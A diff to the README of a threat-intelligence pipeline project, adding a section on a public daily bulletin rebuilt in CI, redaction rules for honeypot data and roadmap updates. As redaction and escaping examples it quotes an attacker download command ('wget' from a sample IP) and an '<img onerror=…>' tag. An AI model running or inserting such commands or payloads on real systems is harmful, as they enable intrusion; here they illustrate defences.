@@ -406,6 +406,38 @@ The sensor itself has not been deployed yet; that needs an Oracle account.
 See `docs/adr/0009-honeypot-sensor-on-oracle-always-free.md`, including the
 list of what can only be verified once the VM exists.
 
+### Publish it: the daily bulletin
+
+**Live: [nourelhoudafarhat.github.io/aegis](https://nourelhoudafarhat.github.io/aegis/)**
+
+Every morning GitHub Actions starts an empty machine, runs this entire
+pipeline for real — Redpanda, MinIO, Postgres, four feeds, Iceberg, dbt, the
+models — exports the results and deploys them:
+
+```powershell
+aegis publish export --out site/data   # the same command CI runs
+```
+
+That is the strongest claim the project can make: if it cannot be rebuilt from
+nothing, the workflow fails, nothing is deployed, and yesterday's bulletin
+stays up labelled with its age.
+
+What reaches the page is an **allow list**: each file comes from an explicit
+`SELECT` of named columns, so a new Silver column stays private until someone
+publishes it deliberately. Threat-feed indicators are published as received —
+their publishers share them for exactly this purpose. Honeypot data is not:
+
+| Rule | Why |
+|---|---|
+| Attacker IPs become HMAC-SHA256 pseudonyms | plain hashes of all 4.3 billion IPv4 addresses can be brute-forced in minutes |
+| IPs inside commands are redacted | `wget http://198.51.100.9/x` → `wget http://[ip]/x` |
+| No key, no export | the run fails rather than publishing raw addresses |
+| A final scan rejects IP-shaped values | a last guard if a new field ever carries one |
+
+The page treats its own data as hostile: malware tags and attacker commands are
+inserted as text, never as HTML, so a tag named `<img onerror=…>` cannot run on
+the page.
+
 ## Project layout
 
 ```
@@ -426,6 +458,8 @@ aegis/
 │   ├── ml/                   # ④ campaigns, ransomware scoring, semantic search, MLflow
 │   └── api/                  # ⑤ FastAPI serving layer
 ├── dbt/                      # ④ silver + gold models, tests, docs
+├── site/                     # ⑤ the public bulletin (no build step)
+├── requirements/             # exact versions CI installs from
 ├── scripts/doctor.py         # environment diagnostics
 ├── tests/
 └── docs/
@@ -445,13 +479,18 @@ aegis/
 | **5** | Orchestration: Dagster assets, checks, freshness, schedule | 🟢 **Done** |
 | **6** | AI on the feeds: campaign clustering, ransomware scoring, semantic CVE search, MLflow | 🟢 **Done** |
 | **7** | Honeypot: Cowrie sensor on Oracle Cloud, attack sessions, session anomaly detection | 🟡 **Built — sensor not yet deployed** |
-| 8 | Product: FastAPI + Next.js real-time dashboard | ⚪ |
+| **8** | Public bulletin: allow-listed export, static dashboard, daily rebuild in CI | 🟢 **Done** |
 | 9 | Security & governance: PII redaction, RBAC, SAST, audit | ⚪ |
 | 10 | Cloud: Terraform, GitHub Actions, observability, FinOps | ⚪ |
 
 The honeypot became its own phase. Anomaly detection needs real attack
 sessions to learn from, and a model trained on invented ones would demonstrate
 nothing. Phase 6 applies ML to the feeds already in the lakehouse instead.
+
+Phase 8 became a static bulletin rather than the FastAPI and Next.js app first
+sketched. The data changes a few times a day, so a socket streaming yesterday's
+table is theatre, and a free server that gets reclaimed makes a portfolio link
+that is down. See `docs/adr/0010-publishing-a-static-bulletin-to-github-pages.md`.
 
 ## Architecture decisions
 
